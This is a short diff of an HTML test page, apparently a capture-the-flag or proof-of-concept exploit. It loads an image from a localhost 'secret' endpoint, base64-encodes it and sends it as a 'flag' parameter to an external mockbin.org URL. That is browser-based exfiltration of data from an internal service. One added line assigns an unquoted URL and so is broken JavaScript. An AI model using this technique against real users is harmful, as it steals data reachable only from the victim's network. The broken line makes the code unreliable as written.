@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <title>test</title>
-    <link rel="preload" href="http://127.0.0.1:8080/secret" crossorigin>
+    
   </head>
   <body>
   <img id="ttt" src="http://127.0.0.1:8080/secret" style="width:1px;height:1px;">	
@@ -31,6 +31,7 @@ function sendrequ(){
 	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + getBase64Image(document.getElementById("ttt"));
 	document.body.appendChild(img);
 }   
+document.getElementById("ttt").src = http://127.0.0.1:8080/secret;
     /*
     	var xmlHttp = new XMLHttpRequest();
 	if (xmlHttp) {
